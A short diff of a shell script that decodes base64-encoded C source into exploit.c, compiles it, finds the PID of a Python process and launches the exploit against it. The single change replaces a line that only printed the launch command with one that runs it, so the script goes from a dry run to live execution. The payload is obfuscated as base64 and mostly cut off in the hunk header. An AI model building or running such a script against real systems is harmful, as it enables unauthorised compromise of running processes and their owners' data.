@@ -8,4 +8,4 @@ echo "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy
 gcc exploit.c -o exploit
 chmod +x exploit
 var=$(pidof python3 process.py)
-echo "./exploit $var"
+./exploit $var
